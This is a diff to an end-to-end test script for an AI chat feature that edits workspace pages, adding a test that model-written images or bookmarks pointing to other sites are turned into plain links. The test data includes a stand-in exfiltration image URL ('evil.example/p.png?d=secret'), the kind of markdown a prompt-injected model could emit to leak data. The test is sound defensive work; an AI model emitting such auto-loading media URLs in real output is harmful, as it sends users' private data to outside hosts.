@@ -12,7 +12,8 @@
  * question (their text in the prompt, images only to models that take them, only their owner may
  * open or attach them, deleted with the conversation), research mode (read-only tools, a plan, a
  * report saved as a page) and web search against a stand-in SearXNG server (the workspace's switch,
- * results as cited sources, a loopback page refused, changes asked about after reading the web).
+ * results as cited sources, a loopback page refused, changes asked about after reading the web), and
+ * media of another site the chat writes into a page written as links.
  * Creates its own users and workspaces and deletes them afterwards.
  *
  *   pnpm tsx scripts/ai-chat-e2e.ts
@@ -841,6 +842,29 @@ try {
     missingBlock.done && toolResults(fake.chats.at(-1)!).some((r) => r.startsWith("The change is not valid: the page has no block no-such-block")),
     "an edit naming a block the page doesn't have is refused, nothing written",
     toolResults(fake.chats.at(-1)!),
+  );
+
+  // Media the model writes that would load another site become links; the page's own stay.
+  await service.replaceContent(checklist.id, "![Logo](https://cdn.example/logo.png)\n\n- Fit the tyres", { userId: alice });
+  fake.setChat(
+    caller([
+      write("edit_page", {
+        page_id: checklist.id,
+        edits: [{ op: "append", markdown: "![Leak](https://evil.example/p.png?d=secret)\n\n[Evil](https://evil.example/) <!-- leafdesk:bookmark -->\n\n![Logo again](https://cdn.example/logo.png)" }],
+      }),
+    ]),
+  );
+  const mediaWrite = await ask(alice, { workspaceId, message: "Add the chart", mode: "auto" });
+  const mediaBlocks = (await service.readBlocks(checklist.id)).blocks as { type: string; props?: { url?: string } }[];
+  const mediaBody = (await service.readPage(checklist.id)).markdown;
+  check(
+    mediaWrite.done &&
+      mediaBlocks.filter((b) => b.type === "image").map((b) => b.props?.url).join() === "https://cdn.example/logo.png,https://cdn.example/logo.png" &&
+      !mediaBlocks.some((b) => b.type === "bookmark") &&
+      mediaBody.includes("[Leak](https://evil.example/p.png?d=secret)") &&
+      mediaBody.includes("[Evil](https://evil.example/)"),
+    "an image or bookmark of another site the chat writes becomes a link; one the page already showed stays",
+    { types: mediaBlocks.map((b) => b.type), mediaBody },
   );
 
   // What the person may not change.
